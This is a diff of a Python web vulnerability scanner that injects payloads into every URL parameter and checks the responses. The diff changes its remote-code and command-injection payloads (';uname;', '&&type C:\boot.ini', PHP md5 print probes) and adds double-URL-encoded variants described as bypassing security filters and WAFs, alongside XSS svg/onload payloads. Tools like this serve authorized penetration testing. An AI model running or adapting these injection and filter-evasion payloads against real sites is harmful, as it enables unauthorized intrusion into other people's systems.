@@ -7,6 +7,12 @@ import urllib
 import re
 from headers import *
 
+#updates:
+# 1- Fixed the empty parameters issue => Done.
+# 2- User agents when sending a Request => Done.
+# 3- Will try to add XSS Injection in Cookies, Refere and UserAgent
+#
+
 def main_function(url, payloads, check):
         #This function is going to split the url and try the paylods instead of every parameter value.
         opener = urllib.urlopen(url)
@@ -17,11 +23,15 @@ def main_function(url, payloads, check):
                 print ga.red +" [~] Delaying 3 seconds between every request"+ga.end
                 time.sleep(3)
         for params in url.split("?")[1].split("&"):
-            sp = params.split("=")[1]
+            #sp = params.split("=")[0]
             for payload in payloads:
-                bugs = url.replace(sp, str(payload).strip())
-                request = urllib.urlopen(bugs).readlines()
-                for line in request:
+                #bugs = url.replace(sp, str(payload).strip())
+                bugs = url.replace(params, params + str(payload).strip())
+		#print bugs
+		#exit()
+                request = useragent.open(bugs)
+		html = request.readlines()
+                for line in html:
                     checker = re.findall(check, line)
                     if len(checker) !=0:
                         print ga.red+" [*] Payload Found . . ."+ga.end
@@ -33,7 +43,7 @@ def main_function(url, payloads, check):
         if vuln == 0:                
         	print ga.green+" [!] Target is not vulnerable!"+ga.end
         else:
-        	print ga.blue+" [!] Congratulations you found %i bugs :) " % (vuln) +ga.end
+        	print ga.blue+" [!] Congratulations you've found %i bugs :-) " % (vuln) +ga.end
 
 # Here stands the vulnerabilities functions and detection payloads. 
 def rce_func(url):
@@ -42,11 +52,11 @@ def rce_func(url):
   	print ga.blue+" [!] Covering Linux & Windows Operating Systems "+ga.end
   	print ga.blue+" [!] Please wait ...."+ga.end
   	# Remote Code Injection Payloads
-  	payloads = ['${@print(md5(zigoo0))}', '${@print(md5("zigoo0"))}']
+  	payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
   	# Below is the Encrypted Payloads to bypass some Security Filters & WAF's
-  	payloads += ['%24%7b%40%70%72%69%6e%74%28%6d%64%35%28%22%7a%69%67%6f%6f%30%22%29%29%7d%3b']
+  	payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
   	# Remote Command Execution Payloads
-  	payloads += ['uname;', 'dir', '&&dir', 'type C:\\boot.ini', 'phpinfo();', 'phpinfo']
+  	payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
   	# used re.I to fix the case sensitve issues like "payload" and "PAYLOAD".
   	check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
   	main_function(url, payloads, check)
@@ -59,3 +69,5 @@ def xss_func(url):
         payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
         check = re.compile('zigoo0<svg|x>x', re.I)
         main_function(url, payloads, check)
+
+
